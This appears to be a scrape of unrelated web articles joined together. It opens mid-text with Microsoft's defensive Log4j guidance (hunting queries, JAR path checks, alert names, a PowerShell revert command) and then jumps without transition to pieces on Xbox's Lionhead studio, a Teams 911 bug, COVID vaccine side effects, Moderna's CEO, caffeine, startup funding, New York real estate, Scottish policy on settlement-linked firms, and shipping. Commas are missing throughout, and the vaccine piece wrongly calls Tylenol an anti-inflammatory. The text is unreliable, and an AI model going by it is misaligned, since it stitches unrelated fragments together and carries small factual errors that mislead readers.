DeviceTvmSoftwareEvidenceBeta | mv-expand DiskPaths | where DiskPaths contains ""log4j"" | project DeviceId SoftwareName SoftwareVendor SoftwareVersion DiskPaths

To complement this new table the existing DeviceTvmSoftwareVulnerabilities table in advanced hunting can be used to identify vulnerabilities in installed software on devices:

DeviceTvmSoftwareVulnerabilities | where CveId in (""CVE-2021-44228"" ""CVE-2021-45046"")

These capabilities integrate with the existing threat and vulnerability management experience and are gradually rolling out. As of December 27 2021 discovery is based on installed application CPEs that are known to be vulnerable to Log4j RCE as well as the presence of vulnerable Log4j Java Archive (JAR) files.

As of January 20 2022 threat and vulnerability management can discover vulnerable Log4j libraries including Log4j files and other files containing Log4j packaged into Uber-JAR files. This capability is supported on Windows 10 Windows 11 Windows Server 2019 and Windows Server 2022. It is also supported on Windows Server 2012 R2 and Windows Server 2016 using the Microsoft Defender for Endpoint solution for earlier Windows server versions.

Threat and vulnerability management provides layers of detection to help customers discover and mitigate vulnerable Log4j components. Specifically it:

determines if a JAR file contains a vulnerable Log4j file by examining JAR files and searching for the following file: \META-INF\maven\org.apache.logging.log4j\log4j-core\pom.properties; if the said file exists the Log4j version is read and extracted searches for the JndiLookup.class file inside the JAR file by looking for paths that contain the string “/log4j/core/lookup/JndiLookup.class”; if the JndiLookup.class file exists threat and vulnerability management determines if this JAR contains a Log4j file with the version defined in pom.properties searches for any vulnerable Log4j-core JAR files embedded within nested-JAR by searching for paths that contain any of these strings: lib/log4j-core-

WEB-INF/lib/log4j-core-

App-INF/lib/log4j-core-

Figure 3. Threat and vulnerability management finds exposed paths

Figure 4. Threat and vulnerability management finds exposed devices based on vulnerable software and vulnerable files detected on disk

Note: Scan results may take some time to reach full coverage and the number of discovered devices may be low at first but will grow as the scan reaches more devices. A regularly updated list of vulnerable products can be viewed in the Microsoft 365 Defender portal with matching recommendations. We will continue to review and update this list as new information becomes available.

Through device discovery unmanaged devices with products and services affected by the vulnerabilities are also surfaced so they can be onboarded and secured.

Figure 5. Finding vulnerable applications and devices via software inventory

Applying mitigation directly in the Microsoft 365 Defender portal

We have released two new threat and vulnerability management capabilities that can significantly simplify the process of turning off JNDI lookup a workaround that can prevent the exploitation of the Log4j vulnerabilities on most devices using an environment variable called LOG4J_FORMAT_MSG_NO_LOOKUPS. These new capabilities provide security teams with the following:

View the mitigation status for each affected device. This can help prioritize mitigation and/or patching of devices based on their mitigation status.

To use this feature open the Exposed devices tab in the dedicated CVE-2021-44228 dashboard and review the Mitigation status column. Note that it may take a few hours for the updated mitigation status of a device to be reflected.

Figure 6. Viewing each device’s mitigation status

Apply the mitigation (that is turn off JNDI lookup) on devices directly from the portal. This feature is currently available for Windows devices only.

The mitigation will be applied directly via the Microsoft Defender for Endpoint client. To view the mitigation options click on the Mitigation options button in the Log4j dashboard:

You can choose to apply the mitigation to all exposed devices or select specific devices for which you would like to apply it. To complete the process and apply the mitigation on devices click Create mitigation action.

Figure 7. Creating mitigation actions for exposed devices.

In cases where the mitigation needs to be reverted follow these steps:

Open an elevated PowerShell window Run the following command:

[Environment]::SetEnvironmentVariable(""LOG4J_FORMAT_MSG_NO_LOOKUPS"" $null [EnvironmentVariableTarget]::Machine)

The change will take effect after the device restarts.

Microsoft 365 Defender advanced hunting

Advance hunting can also surface affected software. This query looks for possibly vulnerable applications using the affected Log4j component. Triage the results to determine applications and programs that may need to be patched and updated.

Microsoft Defender for Cloud

Microsoft Defender for servers

Organizations using Microsoft Defender for Cloud can use Inventory tools to begin investigations before there’s a CVE number. With Inventory tools there are two ways to determine exposure across hybrid and multi-cloud resources:

Vulnerability assessment findings – Organizations who have enabled any of the vulnerability assessment tools (whether it’s Microsoft Defender for Endpoint’s threat and vulnerability management module the built-in Qualys scanner or a bring your own license solution) they can search by CVE identifier:

Figure 9. Searching vulnerability assessment findings by CVE identifier

Software inventory – With the combined integration with Microsoft Defender for Endpoint and Microsoft Defender for servers organizations can search for resources by installed applications and discover resources running the vulnerable software:

Figure 10. Searching software inventory by installed applications

Note that this doesn’t replace a search of your codebase. It’s possible that software with integrated Log4j libraries won’t appear in this list but this is helpful in the initial triage of investigations related to this incident. For more information about how Microsoft Defender for Cloud finds machines affected by CVE-2021-44228 read this tech community post.

Microsoft Defender for Containers

Microsoft Defender for Containers is capable of discovering images affected by the vulnerabilities recently discovered in Log4j 2: CVE-2021-44228 CVE-2021-45046 and CVE-2021-45105. Images are automatically scanned for vulnerabilities in three different use cases: when pushed to an Azure container registry when pulled from an Azure container registry and when container images are running on a Kubernetes cluster. Additional information on supported scan triggers and Kubernetes clusters can be found here.

Log4j binaries are discovered whether they are deployed via a package manager copied to the image as stand-alone binaries or included within a JAR Archive (up to one level of nesting).

We will continue to follow up on any additional developments and will update our detection capabilities if any additional vulnerabilities are reported.

Finding affected images

To find vulnerable images across registries using the Azure portal navigate to the Microsoft Defender for Cloud service under Azure Portal. Open the Container Registry images should have vulnerability findings resolved recommendation and search findings for the relevant CVEs.

Microsoft Defender for Endpoint

Users of Microsoft Defender for Endpoint can turn on the following attack surface reduction rule to block or audit some observed activity associated with this threat.

Block executable files from running unless they meet a prevalence age or trusted list criterion

Due to the broad network exploitation nature of vectors through which this vulnerability can be exploited and the fact that applying mitigations holistically across large environments will take time we encourage defenders to look for signs of post-exploitation rather than fully relying on prevention. Observed post exploitation activity such as coin mining lateral movement and Cobalt Strike are detected with behavior-based detections.

Alerts with the following titles in the Security Center indicate threat activity related to exploitation of the Log4j vulnerability on your network and should be immediately investigated and remediated. These alerts are supported on both Windows and Linux platforms:

Log4j exploitation detected – detects known behaviors that attackers perform following successful exploitation of the CVE-2021-44228 vulnerability

– detects known behaviors that attackers perform following successful exploitation of the CVE-2021-44228 vulnerability Log4j exploitation artifacts detected (previously titled Possible exploitation of CVE-2021-44228) – detects coin miners shells backdoor and payloads such as Cobalt Strike used by attackers post-exploitation

(previously titled Possible exploitation of CVE-2021-44228) – detects coin miners shells backdoor and payloads such as Cobalt Strike used by attackers post-exploitation Log4j exploitation network artifacts detected (previously titled Network connection seen in CVE-2021-44228 exploitation) – detects network traffic connecting traffic connecting to an address associated with CVE-2021-44228 scanning or exploitation activity

The following alerts may indicate exploitation attempts or testing/scanning activity. Microsoft advises customers to investigate with caution as these alerts don’t necessarily indicate successful exploitation:

Possible target of Log4j exploitation – detects a possible attempt to exploit the remote code execution vulnerability in the Log4j component of an Apache server in communication received by this device

detects a possible attempt to exploit the remote code execution vulnerability in the Log4j component of an Apache server in communication this device Possible target of Log4j vulnerability scanning – detects a possible attempt to scan for the remote code execution vulnerability in a Log4j component of an Apache server in communication received by this device

– detects multiple behaviors including suspicious command launch post-exploitation Possible Log4j exploitation (CVE-2021-44228) – inactive initially covered several of the above now replaced with more specific titles

The following alerts detect activities that have been observed in attacks that utilize at least one of the Log4j vulnerabilities. However these alerts can also indicate activity that is not related to the vulnerability. We are listing them here as it is highly recommended that they are triaged and remediated immediately given their severity and the potential that they could be related to Log4j exploitation:

Suspicious remote PowerShell execution

Download of file associated with digital currency mining

In response to this threat Azure Web Application Firewall (WAF) has updated Default Rule Set (DRS) versions 1.0/1.1 available for Azure Front Door global deployments and OWASP ModSecurity Core Rule Set (CRS) version 3.0/3.1 available for Azure Application Gateway V2 regional deployments.

To help detect and mitigate the Log2Shell vulnerability by inspecting requests’ headers URI and body we have released the following:

For Azure Front Door deployments we have updated the rule 944240 “Remote Command Execution” under Managed Rules

under Managed Rules For Azure Application Gateway V2 regional deployments we have introduced a new rule Known-CVEs/800100 in the rule group Known-CVEs under Managed Rules

These rules are already enabled by default in block mode for all existing WAF Default Rule Set (DRS) 1.0/1.1 and OWASP ModSecurity Core Rule Set (CRS) 3.0/3.1 configurations. Customers using WAF Managed Rules would have already received enhanced protection for Log4j 2 vulnerabilities (CVE-2021-44228 and CVE-2021-45046); no additional action is needed.

Recommendation: Customers are recommended to enable WAF policy with Default Rule Set 1.0/1.1 on their Front Door deployments or with OWASP ModSecurity Core Rule Set (CRS) versions 3.0/3.1 on Application Gateway V2 to immediately enable protection from this threat if not already enabled. For customers who have already enabled DRS 1.0/1.1 or CRS 3.0/3.1 no action is needed. We will continue to monitor threat patterns and modify the above rule in response to emerging attack patterns as required.

The sixth episode of Power On: The Story of Xbox features a short segment dedicated to Lionhead. “One of the biggest missteps that we learned from in the past was Lionhead” said Shannon Loftis who was General Manager of Global Games Publishing when Lionhead was shuttered. “We had already published Fable 1 and it was a hit... People wanted more and so we bought Lionhead. Those were good years.

“But after Fable 2 Kinect came along and the Fable-Kinect marriage just never really took” she explained. “And then Fable: The Journey was a passion project for a lot of people but I think it deviated pretty significantly from the pillars of what made Fable 1 and 2 so popular.”

“We acquired Lionhead in 2006 and shut it down in 2016” said Sarah Bond Head of Game Creator Experiences and Ecosystem at Xbox. “A couple of years later we reflected back on that experience. What did we learn and how do we not repeat our same mistakes?”

So what did Microsoft learn? “You acquire a studio for what they’re great at now and your job is to help them accelerate how they do what they do not them accelerate what you do” said Phil Spencer Head of Xbox.

It’s clear at least among those interviewed for the documentary that Microsoft realises that they messed up with the British studio. “I wish Lionhead were still a viable studio” said Loftis.

While Lionhead is sadly no more the studio's legacy lives on with a new Fable game currently in development at Playground Games. This new version will balance old and new ideas for the fantasy RPG and will be built on the Forza engine which is no bad thing considering Forza Horizon 5 is one of the most beautiful games ever made.

According to former XDA editor-in-chief Mishaal Rahman Microsoft has fixed a Teams bug that led to failed 911 calls on devices using Android 10 or later. Reddit user KitchenPicture5849 discovered that having Teams installed but not signed in would prevent emergency calls from going through. The phone would say a call was active and ring once but never properly initiate the connection — call logs would show nothing.

Rahman and friend Kuba Wojciechowski pinpointed the cause. While all Android calling apps will try to create a PhoneAccount class instance in the operating system Teams was creating instances every time a user started the app ""cold"" — that increased the chances of a sorting problem that stopped calls from going through.

Google talked to the Reddit user and revealed that both the company and Microsoft were planning fixes. In addition to the Microsoft patch Google is delivering an Android platform update on January 4th that should address its side of the problem. You can delete and reinstall Teams to clear any excess PhoneAccount instances and staying logged in should prevent any mishaps.

Google said this only affected a ""small number of devices."" The issue however was the severity. This could have blocked someone from making a life-saving call through no fault of their own."

Most side effects stop within 48 hours.

The vaccine cannot cause a COVID-19 infection so symptoms mean your body is building a healthy immune response.

If you’re getting ready for the first second or booster dose of your COVID-19 vaccine you may wonder about what side effects to expect and how to deal with them.

Some side effects happen right after your shot like mild pain in your arm. Others may take hours to develop. Remember that with the two-dose vaccines like Pfizer-BioNTech and Moderna you may notice more side effects after the second shot.

Illustration by Theresa Chiechi for Verywell Health

This article offers a step-by-step timeline of possible symptoms to help you understand what to expect after the jab.

Right After Vaccination

The COVID vaccines are intramuscular or ""IM"" for short. That means the liquid in the syringe goes directly into a muscle when the needle goes in.

Your body's immune system sees this as a threat and pain at the injection site is part of its response. That's why your arm may feel sore turn red or swell a bit. Some people who get the Moderna vaccine may experience ""COVID arm"" a delayed skin reaction with raised red welts on the arm.

The mild pain that COVID-19 vaccines may cause is similar to what some people report after the tetanus vaccination Michelle Barron MD senior medical director of infection prevention and control for the University of Colorado Health tells Verywell.

The Centers for Disease Control and Prevention (CDC) recommends placing a cool wet washcloth over the area to help ease any pain. Moving or exercising your arm also may help.

15 Minutes After Vaccination

The risk of anaphylaxis—a severe allergic reaction to the vaccine—is lower just 15 to 30 minutes after vaccination. This reaction is very rare but the CDC requires everyone who gets the vaccine to wait in the clinic for 15 minutes after getting the shot just in case it happens.

“If you've had allergic reactions in the past we want people staying for 30 minutes” Kate Mullane DO PharmD professor of medicine and infectious disease specialist at the University of Chicago tells Verywell.

Recap Although it's rare it's possible to have an allergic reaction within the first 15 to 30 minutes after the jab. It's much more common to feel some soreness in your arm at the injection site and the surrounding skin may get a little red and swollen.

12 Hours After Vaccination

Other side effects may start within a few hours or up to 12 hours after the shot. People commonly report systemic side effects like fever headaches muscle aches joint pain chills and fatigue.

In the Pfizer-BioNTech vaccine trials more than 77% of participants reported at least one systemic reaction. The most common were fatigue headache and new or worsened muscle pain.

Some less common side effects include nausea and swollen lymph nodes (especially in the armpit).

There's no need to worry about any of the flu-like symptoms. The side effects mean your body is working hard to build the antibodies and cells it will need to fight the virus if or when you are exposed to it.

“Although you feel terrible it's a good thing because those systemic effects are telling you that your body is making an immune reaction” Mullane says.

12 to 48 Hours After Vaccination

Once these body-wide side effects set in they can last for 12 hours or more. Experts say these side effects should all stop within 24 to 48 hours after your shot though you may still have some slight fatigue or arm soreness after that.

Mullane says it’s best to avoid important events or take on key tasks the day after your vaccination if you’re concerned about the side effects. That's because your vaccine appointment and the window for peak symptoms aren't likely to happen at the same time. Most side effects come later.

It’s OK to take an anti-inflammatory medication like Tylenol or ibuprofen to relieve any symptoms. But Mullane says not to take it before the shot as it can interfere with your immune response.

Recap Many people report a sore arm mild fever or other symptoms after vaccination. These are not serious and will go away on their own. An August 2021 report from U.S. health officials found that with 187 million people in the U.S. getting at least one dose the vaccine benefits are far greater than the risks. But rare and serious complications may occur. They include:

Guillain-Barré syndrome (Johnson & Johnson)

Thrombosis or blood clots (Johnson & Johnson)

Myocarditis (Pfizer-BioNTech and Moderna)

After 48 Hours

If you still have severe symptoms two full days after your vaccination you may want to talk with your doctor to see what to do next. It’s possible that while you had vaccine side effects you were also ill with COVID-19 or a different infection.

“If the symptoms persist beyond the 48 hours and aren't getting better or if you develop any kind of respiratory symptoms you should get evaluated” Barron says.

It’s important to note that you cannot get COVID-19 from any of the approved vaccines. However it can take up to two weeks after the second shot of the two-dose vaccines or the single dose of the Johnson & Johnson to mount a full immune response.

A COVID infection and its symptoms are still possible until the end of this two-week waiting period. It also is possible to have a breakthrough infection which means you have COVID even though you got the vaccine.

What This Means For You If you’re worried about how your body may respond to the vaccine plan to take it easy in the day or two after your appointment. While it’s safe to exercise go to work and be around other people during that time side effects like fever and fatigue may make it uncomfortable to do so.

Side Effects Vary

When you hear about other people's experiences remember that the vaccine side effects can vary greatly. Barron says that in general the side effects reported in the clinical trial data are the same as what people say after getting their own vaccines.

“In the clinical trials younger people were more likely to have reactions than older people” Barron says. “They tended to have more of the systemic symptoms like the fever and chills and older people just reported a little bit of fatigue and arm soreness.”

“The healthier you are the more in tune your immune system is the higher the likelihood that you're going to have side effects because your immune system gets turned on” Mullane adds.

If you don’t have intense side effects like a high fever or body aches it doesn’t necessarily mean your body won’t be protected against the virus. The time or intensity with which people’s immune systems respond to vaccines can differ based on many factors.

While the side effects can cause some pain and discomfort Barron says that these effects are far better than the risks of getting sick with COVID-19.

“Forty-eight hours of side effects versus potentially the risk for hospitalization and death—I sort of think that favors the vaccine” Barron says. “If there's any hesitation because of side effects I’ll say the disease is far worse…or has the potential to be far worse.”

Summary

The best way to prepare yourself for a COVID vaccine is to learn about the possible side effects to expect. For most people this means some mild symptoms like a sore arm or flu-like symptoms that last up to two days before going away.

In rare cases a serious reaction or complication may follow COVID vaccination. That's not a reason to avoid a vaccine because the benefits still outweigh the risks but it is a good idea to keep a close eye on how you feel after getting your shot.

Call your doctor if you think your symptoms are serious.



Frequently Asked Questions Why does moving your sore arm after a vaccine help relieve the discomfort? Part of the body's immune response to a vaccination is swelling in the area where the injection occurred. As a result this causes soreness at the injection site. Movement and stretching can help by loosening up the muscle and decreasing inflammation while also allowing the medication to spread out from the area.

How common are side effects after COVID-19 vaccination? COVID-19 vaccine side effects are very common and most often occur after the second dose for those vaccines requiring a two-dose series. One study showed that 70% and 75% of participants reported soreness at the injection site after the first and second doses respectively. Up to 70% reported body-wide reactions like fatigue headache fever and muscle aches.

How long does the Moderna ""COVID arm"" side effect usually last? COVID arm may appear about seven days after receiving the Moderna vaccine. It usually goes away within a few days but may last up to 21 days.

The Moderna CEO’s observation that existing vaccines will be less effective at tackling Omicron than earlier strains of Covid-19 rattled investors sufficiently to spark another global lurch downwards says the Financial Times. The mood has since lightened – there are signs the variant may prove less serious than feared. But Moderna and other vaccine-makers still have their work cut out. Bancel reckons Moderna could make between two and three billion Omicron-targeted doses next year but it’s a balancing act. “It would be risky” he says to shift the entire production capacity into the fight when other variants are still in circulation.

At the vanguard of science

Moderna is now such a household name that it’s almost a shock to recall that its sole commercial product is the Covid-19 vaccine. “Before the pandemic Moderna was simply a heavily loss-making biotech with unproven technology” says The Sunday Times. But delivery of its mRNA jab “has cemented its place at the vanguard of scientific discovery”. It has also made a small fortune for Bancel who owns around 8% of the Cambridge Massachusetts-based outfit’s shares which have jumped by more than 1000% since it floated on Nasdaq in 2018. In just over a decade since Moderna was founded – on the-then radical hunch that mRNA could be used to treat cancer diabetes and genetic diseases – its market value has shot up to nearly $115bn. As a peer observes: “The pandemic came almost as a blessing to prove the technology”.

According to early investor Baillie Gifford the pugnacious Frenchman has always stood out from the crowd as “a relentless risk optimiser”. Bancel famously quit a “safe job” as CEO of the French diagnostics multinational BioMérieux to join the fledgling Moderna in 2011 – telling his photographer wife Brenda there was just a 5% chance that its “crazy idea” would work. As he observed on a recent Distillations podcast he couldn’t forego the “chance of changing medicine forever”.

The emperor was clothed

Born in 1972 Bancel grew up in Marseilles the son of an engineer and a doctor – fusing these professions into his own life when he chose to study biomolecular engineering at École Centrale in Paris. His subsequent move to Minnesota for a masters opened up the world of US business. Bancel’s first job was at BioMérieux which had sponsored his MBA at Harvard. At 29 he joined the US drug-maker Eli Lilly before returning to lead BioMérieux when he was just 34.

In Moderna’s early days cash was so tight it often struggled to keep the lights on for six months at a time. Bancel who had “an almost messianic reverence for the mRNA technology” took an all or nothing approach: you either got with the plot or you were out noted industry journal Stat in 2016. Reports of conflicts and defections multiplied – even as Bancel succeeded in persuading the industry’s big-hitters of Moderna’s potential (forging a transforming $240m partnership with AstraZeneca in 2013). He later consulted the HR departments of some tech firms for “tips on employee retention”. The charge of scientific critics back then was that Moderna was “a case of emperor’s new clothes”. Whatever Bancel’s current challenges he has been vindicated.

Its side effects can be a 'double-edged sword',"For the early-rising workaholic or the 5 a.m. gym nut caffeine may be part of a morning ritual for the day.

Whether it’s waking up before an hour-long commute or bringing blood to the muscles to pump some iron a study published by the National Institutes of Health asserts that 85% of Americans drink at least one caffeinated beverage each day .

Kat Thomsen a registered dietitian at Avera Queen of Peace Hospital in Mitchell said caffeine consumption is not a major concern of healthcare providers — if consumed in moderation.

“Caffeine is a natural stimulant so it's found in different seeds or beans around the world like coffee beans” Thomsen said. “I think the advice for caffeine goes for almost everything that it’s OK in moderation.”

Some governments around the world classify caffeine as a drug  but the United States takes a different stance. While the NIH acknowledges that caffeine has addictive properties similar to many scheduled drugs it considers caffeine reliance a dependency not an addiction .

Caffeine’s chemical properties actually help a person feel like they have more energy by working to increase blood flow throughout the body.

“It's a central nervous stimulant. A lot of times it's tied to exercise because it helps people perform a little bit better when they get the right amount just because it's stimulating the central nervous system their heart and their muscles as well” Thomsen said.

When it enters the body caffeine will bind to receptors in the nerves helping to block chemicals associated with stress which can help an individual feel more alert.

Caffeine is contained in many popular drinks. Monster Energy (outside) typically contains 160 milligrams of caffeine in their standard can while Peace Tea (inside) contains just 23 milligrams in their standard size. (Hunter Dunteman / Mitchell Republic)

Despite this Thomsen said there’s a limit to how much caffeine should be consumed in a day.

“The national limit is 400 milligrams a day” Thomsen said. “One energy drink is 180 milligrams a day. One drink of coffee is a little bit less than that so you're going to be within the recommended range for caffeine but it's multiple drinks that could add up to be too high.”

Some popular brands of pre-workout actually contains up to 330 milligrams of caffeine in a single serving.

A study published by the National Coffee Association found more than half of Americans were cutting that limit close  consuming an average of over 300 milligrams of caffeine each day.

“I think a lot of people don't realize that too much caffeine can be harmful” Thomsen said. “If you're drinking two or more energy drinks in a day long term that can cause undue stress to your body.”

Overstimulation of the central nervous system can cause the heart and muscles to work too hard which over time can cause damage to their long-term performance.

“If you're doing that chronically too much that's where you can start to see potential damage to your body” Thomsen noted.

It also can harm the brain as being too alert throughout the day carries a chance to feel anxious while making it harder for your brain to settle down for a healthy night’s sleep.

“Short term you're maybe a little bit more on. But the same side though is sleep can also help you actually perform better and focus too” Thomsen said. “So that's kind of a double-edged sword. If you're taking so much caffeine that you're not sleeping well It's probably not helping.”

Ultimately Thomsen recommends individuals take note of where caffeine comes from noting other ingredients in energy drinks may not be as beneficial to the body as caffeine from coffee or tea.

“I think the source of your caffeine matters too. There's obviously going to be some health benefits to drinking coffee or tea” Thomsen said. “Regular soda or energy drinks probably aren't going to give you the same benefits.”

Thomsen believes caffeine can be part of a well-balanced life as long as the consumer practices moderation. She suggests individuals with too high of an intake slowly wean off the substance.

“This latest investment will enable Tipalti to add more to our product lines and capabilities in the next 18 months than we have over the past 10 years combined” said Chen Amit co-founder and CEO of Tipalti. “We are on a journey to transform financial operations relieve finance leaders from those mundane cumbersome risky tasks and elevate the financial capabilities for high velocity organizations to rival those of the Fortune 5000.”

Led by VC firm G Squared the Series F round also includes significant investments from new investors Marshall Wace and funds and accounts managed by Counterpoint Global (Morgan Stanley) in addition to current investors Zeev Ventures Durable Capital Partners 01 Advisors and others.

“We believe Tipalti is reshaping how businesses manage their financial operations and their growth and industry-leading retention rates are evidence that they are on a mission to solve important challenges for their customers” said Larry Aschebrook founder and managing partner of G Squared.

In the US alone mid-market companies defined as those with revenues between $10m. and $1b. account for more than one-third of employment and about 40% of GDP. The challenges brought about over the last two years with COVID-19 and other macro changes have also accelerated the transformation in how companies are managing financial operations. Tipalti CEO and co-founder Chen Amit Courtesy

A recent survey found that 99% of CFOs said that their jobs became more complex over the past two years and almost one-third of CFOs noted that international expansion was an area of increased responsibilities – a shift confirmed by 20% of CEOs who indicated global growth as a top priority for their CFOs. However when CFOs are manually managing financial operations they lack critical resources and time that could otherwise be spent on scaling and executing strategic initiatives.

But owners Belvedere Capital Jamestown and Angelo Gordon Co. shrugged off the disrespect at least for now (the rezoning never came to a vote but was withdrawn by the developers when they saw it would fail).

“We’re looking forward not backward” said Industry City Chief Executive Andrew Kimball. He preferred to focus on the enormous strides the 16-building 6-million-square-foot waterfront complex has made since it opened in 2013.

Industry City has leased an impressive 800000 square feet of space — office light manufacturing studio and retail — since March of 2020 the pandemic’s local low point.

Deals with scores of new tenants brought the complex to more than 80 percent leased. Recent and new arrivals include 60000 square feet for Porsche and Volvo with have showrooms as well as service centers West Elm a longtime tenant that added a 10000-square-foot retail store and production company The Garage which specializes in commercials for brands such as Coca-Cola Hershey’s and Cadillac.

Kimball said “It’s truly astonishing. Of 4 million square feet we’ve leased since 2013 the 800000 in the past 18 months are the most we did in any 18-month period. And this was during the global pandemic.”

He attributed the success partly to $450 million the partners invested in new infrastructure for historic century-old buildings at site a former shipping and heavy-manufacturing center. Improvements included creation of five acres of open-air public space.

Another factor is that “we’re finding that people want their office next to their industrial and manufacturing spaces” Kimball said. For example Danny Meyer’s Union Square Hospitality Group leases 20000 square feet of offices within a 70000-square-foot commissary facility all in a single building.

Tenants have mushroomed from 150 in 2013 to 575 today. “Of those 400 have less than 2500 square feet. We’re an extraordinary incubator for small businesses” Kimball said. Some 9000 people now work at the complex compared with 2100 in 2013.



Industry City’s success parallels that of Brooklyn’s other great industrial park the Brooklyn Navy Yard. But unlike the Navy Yard which is city owned and has enjoyed subsidies Industry City is entirely privately owned and funded and is more public-friendly.

Kimball’s optimism extends to the new mayoral administration. “I feel very good about it” he said. “I’ve worked with [former Brooklyn borough president] Eric Adams for many years both at the Navy Yard and at Industry City” he said. Kimball previously was CEO of the Navy Yard Development Corp.

“He cares deeply about economic development” Kimball added. I’m hopeful that Eric really sees the value of this kind of jobs creation.”



It was a slightly shrunken but no less jolly Fried Frank real estate holiday party at Cipriani 42nd Street last week. Despite a smaller guest list the annual industry blowout — on hiatus last year — was a full-scale affair with tons of food and free-flowing boozes.

The law firm’s real estate chairman Jonathan Mechanic effusively greeted arrivals as in the past.

Guests had to show proof of vaccination as well as negative Covid-19 test results from not more than 72 hours before. Among the unmasked attendees: Tishman Speyer’s Rob Speyer who’s overseeing Rockefeller Center’s restaurant revival Empire State Realty Trust’s Tony Malkin whose flagship skyscraper lights up the night sky and L&L chairman David W. Levinson the driving force behind the fast-moving Times Square TSX Hotel project.

Also celebrating were MSD Capital’s Jason Kollander Cushman & Wakefield’s Bruce Mosler JMB Realty’s Morris Bailey of JMB Realty Rudin Management’s Michael Rudin Eastdil’s Roy March KKR’s Chris Lee Vornado’s Michael Franko RXR’s Scott Rechler Rose Associates’ Amy Rose Silverstein Properties’ Marty Burger Morgan Stanley’s John Klopp and Lauren Silverman and CBRE leasing gods Mary Ann Tighe and Stephen Siegel.

“I appreciated everyone for joining us in forging a path forward supporting our city and our industry by coming together and celebrating our renewal” Mechanic said.

If you’re in the restaurant business it pays to have friends in real estate. Simon Oren an owner or partner in a score of Manhattan eateries knew two years ago that the building that was the 16-year home to his popular Cafe d’Alsace at 1695 Second Ave. faced demolition.

He started looking for a new location as the pandemic delayed the tear-down but the bistro’s fate remained in limbo. Then in October 2020 Richard Fodera the landlord of the former Writing Room space one block north — once the site of legendary Elaine’s — approached Oren to say his own tenants were vacating.

Might Oren want to move Cafe d’Alsace there? They shook hands and swiftly made a deal. The restaurant reopens with its gleaming zinc bar terrazzo floors and multicolored vintage bottles at 1703 Second Ave. on Dec. 15.

Zero Irving the 21-story tower on the long-ago Palladium disco site has landed its first office tenant: fast-growing business-to-business payments platform Melio. The firm signed for 25000 square feet on floors 15 and 16.

The starting rent for the 10-year deal is in the low triple digits. Melio is relocating from a smaller WeWork space at 18 W. 18th St. The tower has 176000 square feet of state-of-the-art offices on the 14 top floors.

Melio CEO Matan Bar said “We look forward to establishing our New York headquarters at Zero Irving” aka 124 E. 14th St. The firm’s online platform allows small businesses to seamlessly transfer and receive payments. With offices here and in Tel Aviv and Denver it recently announced an additional funding infusion that tripled its valuation to $4 billion.

Zero Irving was developed by RAL Development Services and Junius Real Estate Partners. The tower grew out of negotiations for a 99-year ground lease from the city which owns the land.

RAL managing director Josh Wein said the project aims to “create the optimal ecosystem for entrepreneurial companies to grow and thrive.”

The ground floor is leased to a high-end food hall under the Urbanspace banner. Floors two through 14 are earmarked for an 80000-square-foot digital skills training center.

Office leasing is handled by a JLL real estate team headed by Mitchell Konsker with Benjamin Bass Dan Turkewtiz Kristen Morgan and Carlee Palmer. Konsker said “Melio was drawn to the property due to the amazing rooftop garden and outdoor area with spectacular views 23 feet of double-height space a private terrace a tenants-only gym and the quality of the new construction.”

The Silicon Valley-based venture capital firm founded by Marc Andreessen and Ben Horowitz which is known as a16z has signed a 10-year lease for 33560 square feet of offices at 200 Lafayette St. The new digs will serve as the firm’s New York headquarters replacing a much smaller footprint at 11 Madison Ave.

The company boasts $19.2 billion in assets under management including a $3.1 billion crypto fund that will be run out of 200 Lafayette St.

The 1893-vintage seven-story building recently underwent a $36 million renovation. Swiss RE owns floors three to seven while Brookfield Properties owns the ground- and second-floor retail portion spaces.

JLL’s Barbara Winter and Carlee Palmer represented the ownership. Current Real Estate Advisors’ Adam Henick and Brandon Charnas repped a16z.

The Scottish Government is investigating whether public money has been handed to companies with links to “illegal” Israeli ­settlements in Palestine.

The UN human rights office issued a report last year naming 112 firms it said were linked to building programmes in the occupied West Bank.

The blacklist includes Airbnb Booking.com Expedia Group and Motorola Solutions.

The Palestinians have hailed the report a “victory for international law” but Israel reacted furiously calling it “shameful”.

And now moves are under way to check what links Scotland has to those companies.

Business minister Ivan McKee has said he will investigate whether any of them have received public money or support in Scotland and then write to any identified to demand an update on their operations in Palestine.

The commitment came in response to a parliamentary question from Greens MSP Ross Greer.

He asked the Scottish Government if it would bar the firms ­identified by the UN from getting support.

McKee responded: “I have asked officials to write to the chief executives of relevant public bodies to remind them of the policy guidance make them aware of this UN list and ask them to provide information to ­officials on any relationships they have with companies on this list.

“Following this I will write to any companies thus identified seeking an update on their ­activities in the Occupied ­Palestinian Territories and what they are doing to cease those specific activities – as identified by the ­independent international fact-finding mission which ­provided the basis for their inclusion in this list.”

About 600000 people live in 140 settlements built since Israel’s occupation of the West Bank and East Jerusalem in 1967. The settlements are ­considered illegal under international law though Israel has always disputed this.

The Palestinians have long called for the removal of the settlements arguing that they challenge their claim for an independent state.

Scottish Greens external affairs spokesperson Greer said: ­“Scotland’s ­commitment to uphold and defend human rights must be demonstrated by actions not just words.

“That’s especially true when there is a clear breach of international law like the illegal Israeli occupation of Palestinian land and the rampant abuse of Palestinian people by illegal settlers.

“It has now been made clear to Scottish public bodies that they should not be complicit with this illegal occupation.

“We must stand up for the basic rights of all Palestinian people.”

The UN report came after four years of work and listed companies supplying equipment and materials or providing services such as banking facilities that were aiding the ­demolition of Palestinian properties or construction of new settlements.

The answer is important: It affects how attractive a shipping stock is to investors and in the case of extreme rate troughs it affects the chances a public company can avoid restructuring or insolvency.

Shipping’s pure-play-versus-mixed-fleet debate has been ongoing for more than a decade and in 2021 there have been major moves from one camp to the other.

Costamare (NYSE: CMRE) purchased another seven bulk carriers last week bringing its dry bulk fleet to 44 ships with aggregate capacity of 2.4 million deadweight tons (DWT). Sponsored by Greece’s Constantakopoulos family Costamare went public in 2016 as pure-play container-ship lessor; it now owns 77 box ships with capacity of 586000 twenty-foot equivalent units. It began diversifying into dry bulk and switched to being a mixed-fleet owner in June.

Container-ship and bulker owner Navios Partners (NYSE: NMM) completed its merger with crude- and product-tanker owner Navios Acquisition on Oct. 15. The Navios Group backed by Angeliki Frangou was once a poster child of pure plays having five separate public entities (a spiderweb of sibling listings rivaled in complexity only by the former Teekay Group family tree). Today the consolidated Navios Partners boasts 142 vessels spanning wet bulk dry bulk and box shipping and is being pitched as a unique broad-based proxy on global trade.

